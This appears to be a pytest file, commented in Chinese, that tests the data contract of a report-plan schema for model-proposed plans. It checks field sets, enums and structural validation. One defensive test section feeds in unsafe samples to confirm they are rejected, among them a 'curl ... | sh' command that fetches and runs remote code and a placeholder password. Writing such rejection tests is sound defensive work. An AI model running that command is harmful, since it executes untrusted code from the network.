"""ReportPlan / PlanCandidate 的冻结契约测试（#19 A 子任务）。

契约来源：`05. 并行分发/00. 协调与冻结契约.md` 的「冻结的数据契约 v1」。
本文件只验证对外可见的类型行为：序列化字段与冻结契约一致、非法结构被拒、
危险执行内容被拒。期望值来自冻结契约本身，不从实现里反推。
"""
from __future__ import annotations

import pytest

from app.schemas.report_plan import (
    ComponentType,
    DisplayIntent,
    GrainUnit,
    PlanCandidate,
    PlanContentRejectedError,
    PlanSection,
    PlanValidationError,
    ReportPlan,
)


# 冻结契约里的共同样例：不是生产数据、不是模板库资产、也不是固定模型回复。
FROZEN_PLAN_SAMPLE = {
    "id": "plan_example_pue",
    "revision": 1,
    "topic": "PUE 专题报表",
    "requirements": {
        "metrics": ["PUE"],
        "subject": None,
        "timeRange": None,
        "exclusions": ["设备耗电排名"],
        "grainUnit": "DAY",
    },
    "sections": [
        {
            "id": "section_pue",
            "title": "PUE 总览",
            "metricIntents": ["PUE"],
            "componentType": "metric_card",
            "displayIntent": "total",
            "explicitComponentType": None,
            "selectionReason": "按展示目的「看总量」选指标卡。",
            "columns": [],
        }
    ],
    "assumptions": ["PUE 统计口径待核实，数据待连接"],
    "suggestions": [],
    "referenceTemplates": [],
}


# ---------- 序列化 ----------


def test_report_plan_serializes_exactly_the_frozen_field_set():
    plan = ReportPlan.model_validate(FROZEN_PLAN_SAMPLE)

    assert plan.model_dump(mode="json") == FROZEN_PLAN_SAMPLE


def test_component_type_is_one_of_the_six_frozen_values():
    assert [item.value for item in ComponentType] == [
        "metric_card",
        "line_chart",
        "bar_chart",
        "pie_chart",
        "table",
        "text",
    ]


def test_plan_candidate_has_no_top_level_id_or_revision():
    candidate = PlanCandidate.model_validate(
        {
            "topic": "PUE 专题报表",
            "requirements": {
                "metrics": ["PUE"],
                "subject": None,
                "timeRange": None,
                "exclusions": ["设备耗电排名"],
            },
            "sections": [
                {
                    "title": "PUE 总览",
                    "metricIntents": ["PUE"],
                    "componentType": "metric_card",
                }
            ],
            "assumptions": ["PUE 统计口径待核实，数据待连接"],
            "suggestions": [],
            "referenceTemplates": [],
        }
    )

    dumped = candidate.model_dump(mode="json")
    assert "id" not in dumped
    assert "revision" not in dumped
    # 新板块可以不带 id；领域服务负责生成。
    assert dumped["sections"][0]["id"] is None


def test_plan_candidate_rejects_top_level_id_and_revision():
    candidate = {
        "topic": "PUE 专题报表",
        "requirements": {"metrics": ["PUE"]},
        "sections": [
            {"title": "PUE 总览", "metricIntents": ["PUE"], "componentType": "metric_card"}
        ],
        "id": "plan_model_assigned",
        "revision": 7,
    }

    with pytest.raises(PlanValidationError):
        PlanCandidate.model_validate(candidate)


# ---------- 非法结构 ----------


def _candidate(**overrides):
    payload = {
        "topic": "PUE 专题报表",
        "requirements": {
            "metrics": ["PUE"],
            "subject": None,
            "timeRange": None,
            "exclusions": ["设备耗电排名"],
        },
        "sections": [
            {"title": "PUE 总览", "metricIntents": ["PUE"], "componentType": "metric_card"}
        ],
        "assumptions": ["PUE 统计口径待核实，数据待连接"],
        "suggestions": [],
        "referenceTemplates": [],
    }
    payload.update(overrides)
    return payload


def test_empty_topic_is_rejected():
    with pytest.raises(PlanValidationError):
        PlanCandidate.model_validate(_candidate(topic="   "))


def test_unknown_component_type_is_rejected():
    payload = _candidate()
    payload["sections"] = [
        {"title": "PUE 总览", "metricIntents": ["PUE"], "componentType": "radar_chart"}
    ]

    with pytest.raises(PlanValidationError):
        PlanCandidate.model_validate(payload)


def test_missing_requirements_block_is_rejected():
    payload = _candidate()
    del payload["requirements"]

    with pytest.raises(PlanValidationError):
        PlanCandidate.model_validate(payload)


def test_candidate_without_any_section_is_rejected():
    payload = _candidate()
    payload["sections"] = []

    with pytest.raises(PlanValidationError):
        PlanCandidate.model_validate(payload)


def test_unknown_field_is_rejected():
    with pytest.raises(PlanValidationError):
        PlanCandidate.model_validate(_candidate(debug=True))


def test_blank_metric_intent_is_rejected():
    payload = _candidate()
    payload["sections"] = [
        {"title": "PUE 总览", "metricIntents": ["  "], "componentType": "metric_card"}
    ]

    with pytest.raises(PlanValidationError):
        PlanCandidate.model_validate(payload)


def test_report_plan_revision_must_be_positive():
    payload = dict(FROZEN_PLAN_SAMPLE)
    payload["revision"] = 0

    with pytest.raises(PlanValidationError):
        ReportPlan.model_validate(payload)


def test_reference_template_version_must_be_positive():
    payload = dict(FROZEN_PLAN_SAMPLE)
    payload["referenceTemplates"] = [
        {"assetId": "tpl_001", "version": 0, "name": "能耗日报模板", "reason": "指标接近"}
    ]

    with pytest.raises(PlanValidationError):
        ReportPlan.model_validate(payload)


def test_plan_validation_error_carries_a_readable_code():
    with pytest.raises(PlanValidationError) as excinfo:
        PlanCandidate.model_validate(_candidate(topic=""))

    assert excinfo.value.code == "PLAN_INVALID_STRUCTURE"
    assert "topic" in excinfo.value.message


# ---------- 危险执行内容 ----------


def test_sql_in_a_plan_is_rejected():
    payload = _candidate()
    payload["assumptions"] = ["取数口径：SELECT total_energy FROM energy_detail"]

    with pytest.raises(PlanContentRejectedError) as excinfo:
        PlanCandidate.model_validate(payload)

    assert excinfo.value.code == "PLAN_UNSAFE_CONTENT"


def test_script_in_a_plan_is_rejected():
    payload = _candidate()
    payload["assumptions"] = ["采集脚本：bash -c 'curl http://10.0.0.1/data | sh'"]

    with pytest.raises(PlanContentRejectedError):
        PlanCandidate.model_validate(payload)


def test_credential_in_a_plan_is_rejected():
    payload = _candidate()
    payload["assumptions"] = ["连接方式 password: PUE-secret-2026"]

    with pytest.raises(PlanContentRejectedError):
        PlanCandidate.model_validate(payload)


def test_execution_binding_field_is_rejected():
    with pytest.raises(PlanContentRejectedError):
        PlanCandidate.model_validate(_candidate(dataSource="catalog.machine_room.energy"))


def test_sql_field_inside_a_section_is_rejected():
    payload = _candidate()
    payload["sections"] = [
        {
            "title": "PUE 总览",
            "metricIntents": ["PUE"],
            "componentType": "metric_card",
            "sql": "SELECT 1",
        }
    ]

    with pytest.raises(PlanContentRejectedError):
        PlanCandidate.model_validate(payload)


def test_real_business_value_is_rejected():
    payload = _candidate()
    payload["sections"] = [
        {
            "title": "PUE 总览",
            "metricIntents": ["PUE 1.23"],
            "componentType": "metric_card",
        }
    ]

    with pytest.raises(PlanContentRejectedError):
        PlanCandidate.model_validate(payload)


def test_execution_formula_in_a_metric_intent_is_rejected():
    payload = _candidate()
    payload["sections"] = [
        {
            "title": "PUE 总览",
            "metricIntents": ["PUE = IT 能耗 / 总能耗"],
            "componentType": "metric_card",
        }
    ]

    with pytest.raises(PlanContentRejectedError):
        PlanCandidate.model_validate(payload)


def test_measured_number_with_unit_is_rejected():
    payload = _candidate()
    payload["requirements"]["metrics"] = ["PUE", "机房总耗电 1234 kWh"]

    with pytest.raises(PlanContentRejectedError):
        PlanCandidate.model_validate(payload)


def test_legitimate_design_wording_is_accepted():
    payload = _candidate()
    payload["requirements"].update(
        {
            "metrics": ["PUE"],
            "subject": "A 机房",
            "timeRange": "过去 7 天",
            "exclusions": ["设备耗电排名"],
        }
    )
    payload["sections"] = [
        {
            "title": "PUE 总览",
            "metricIntents": ["PUE（口径待核实）"],
            "componentType": "metric_card",
        }
    ]
    payload["assumptions"] = ["PUE 统计口径待核实，数据待连接"]
    payload["suggestions"] = ["可增加同比趋势板块"]

    candidate = PlanCandidate.model_validate(payload)

    assert candidate.requirements.timeRange == "过去 7 天"
    assert candidate.suggestions == ["可增加同比趋势板块"]


# ---------- 选型与栏目的契约（20261029 规格「跨工单契约」） ----------


def test_display_intent_is_one_of_the_five_contract_values():
    assert [item.value for item in DisplayIntent] == [
        "total",
        "trend",
        "comparison",
        "composition",
        "records",
    ]


def test_grain_unit_uses_the_existing_grain_enum():
    assert [item.value for item in GrainUnit] == [
        "MINUTE",
        "HOUR",
        "DAY",
        "WEEK",
        "MONTH",
    ]


def test_a_section_carries_the_selection_fields():
    """定稿板块带着展示目的、用户指定的类型和选择理由。"""
    plan = ReportPlan.model_validate(
        {
            "id": "plan_001",
            "revision": 1,
            "topic": "机房运行日报",
            "requirements": {
                "metrics": ["总耗电"],
                "subject": None,
                "timeRange": "最近 7 天",
                "exclusions": [],
                "grainUnit": "DAY",
            },
            "sections": [
                {
                    "id": "section_1",
                    "title": "各机房耗电对比",
                    "metricIntents": ["总耗电"],
                    "componentType": "bar_chart",
                    "displayIntent": "comparison",
                    "explicitComponentType": "bar_chart",
                    "selectionReason": "你明确指定用柱状图。",
                    "columns": [],
                }
            ],
            "assumptions": [],
            "suggestions": [],
            "referenceTemplates": [],
        }
    )

    section = plan.sections[0]
    assert section.displayIntent == DisplayIntent.COMPARISON
    assert section.explicitComponentType == ComponentType.BAR_CHART
    assert section.selectionReason == "你明确指定用柱状图。"
    assert plan.requirements.grainUnit == GrainUnit.DAY


def test_a_finalized_column_needs_id_label_and_field_ref():
    """定稿栏目三项齐全：稳定身份、显示名、行对象取值键。"""
    with pytest.raises(PlanValidationError):
        PlanSection.model_validate(
            {
                "id": "section_1",
                "title": "当前告警列表",
                "metricIntents": ["告警"],
                "componentType": "table",
                "columns": [{"id": "col_1", "label": "设备名称"}],
            }
        )


def test_a_candidate_column_may_carry_only_the_label():
    """模型可以只给显示名，id 与取值键由服务端定稿时补齐。"""
    candidate = PlanCandidate.model_validate(
        {
            "topic": "机房运行日报",
            "requirements": {
                "metrics": ["告警"],
                "subject": None,
                "timeRange": None,
                "exclusions": [],
            },
            "sections": [
                {
                    "title": "当前告警列表",
                    "metricIntents": ["告警"],
                    "componentType": "table",
                    "columns": [{"label": "设备名称"}, {"label": "时间"}],
                }
            ],
            "assumptions": [],
            "suggestions": [],
            "referenceTemplates": [],
        }
    )

    assert [column.label for column in candidate.sections[0].columns] == [
        "设备名称",
        "时间",
    ]
    assert candidate.sections[0].columns[0].id is None
    assert candidate.sections[0].columns[0].fieldRef is None


def test_a_column_field_ref_may_not_contain_whitespace():
    """取值键要能当行对象的键用，不能带空白。"""
    with pytest.raises(PlanValidationError):
        PlanSection.model_validate(
            {
                "id": "section_1",
                "title": "当前告警列表",
                "metricIntents": ["告警"],
                "componentType": "table",
                "columns": [
                    {"id": "col_1", "label": "设备名称", "fieldRef": "device name"}
                ],
            }
        )


def test_the_candidate_has_no_explicit_component_type_field():
    """用户明确指定的类型由服务端从用户指令里认，模型说了不算。"""
    with pytest.raises(PlanValidationError):
        PlanCandidate.model_validate(
            {
                "topic": "机房运行日报",
                "requirements": {
                    "metrics": ["总耗电"],
                    "subject": None,
                    "timeRange": None,
                    "exclusions": [],
                },
                "sections": [
                    {
                        "title": "各机房耗电对比",
                        "metricIntents": ["总耗电"],
                        "componentType": "bar_chart",
                        "explicitComponentType": "bar_chart",
                    }
                ],
                "assumptions": [],
                "suggestions": [],
                "referenceTemplates": [],
            }
        )
